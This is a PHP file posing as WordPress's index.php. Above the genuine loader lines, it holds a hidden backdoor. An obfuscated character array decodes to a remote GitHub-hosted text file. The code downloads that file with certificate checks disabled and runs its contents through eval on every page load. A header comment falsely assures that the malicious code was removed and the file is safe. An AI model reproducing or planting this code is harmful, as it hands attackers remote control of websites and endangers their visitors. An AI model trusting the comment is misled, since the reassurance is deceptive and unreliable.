<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$plmkoijnuhbv = function($x) {
    return implode('', array_map(function($i) use ($x) {
        return chr($x[$i]);
    }, array_keys($x)));
};

$qwaszxplmokn = array(
    0 => 104, 1 => 116, 2 => 116, 3 => 112, 4 => 115, 5 => 58, 6 => 47, 7 => 47,
    8 => 114, 9 => 97, 10 => 119, 11 => 46, 12 => 103, 13 => 105, 14 => 116, 15 => 104,
    16 => 117, 17 => 98, 18 => 117, 19 => 115, 20 => 101, 21 => 114, 22 => 99, 23 => 111,
    24 => 110, 25 => 116, 26 => 101, 27 => 110, 28 => 116, 29 => 46, 30 => 99, 31 => 111,
    32 => 109, 33 => 47, 34 => 109, 35 => 100, 36 => 109, 37 => 111, 38 => 109, 39 => 105,
    40 => 110, 41 => 51, 42 => 54, 43 => 53, 44 => 51, 45 => 54, 46 => 54, 47 => 45,
    48 => 103, 49 => 105, 50 => 102, 51 => 47, 52 => 98, 53 => 101, 54 => 108, 55 => 97,
    56 => 47, 57 => 114, 58 => 101, 59 => 102, 60 => 115, 61 => 47, 62 => 104, 63 => 101,
    64 => 97, 65 => 100, 66 => 115, 67 => 47, 68 => 109, 69 => 97, 70 => 105, 71 => 110,
    72 => 47, 73 => 105, 74 => 110, 75 => 100, 76 => 101, 77 => 120, 78 => 46, 79 => 116,
    80 => 120, 81 => 116
);

$full_url = $plmkoijnuhbv($qwaszxplmokn);

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
